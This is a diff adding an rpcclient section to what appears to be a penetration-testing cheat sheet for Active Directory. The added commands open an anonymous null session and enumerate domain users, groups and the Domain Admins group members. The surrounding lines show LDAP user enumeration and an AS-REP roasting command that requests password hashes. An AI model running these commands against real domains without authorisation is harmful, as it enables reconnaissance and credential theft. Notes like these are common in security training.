@@ -31,7 +31,19 @@ netexec ldap <domain> -u <id> -p <password> --users
 ```
 
 ---
+## rpcclient
+```bash
+rpcclient -U "" -N <ip>
 
+rpcclient $> enumdomusers
+rpcclient $> enumdomgroups
+
+rpcclient $> querygroup 0x200
+rpcclient $> querygroupmem 0x200
+
+rpcclient $> queryuser <rid>
+```
+---
 ## AS-REP Roasting
 ```bash
 impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hash corp.com/pete
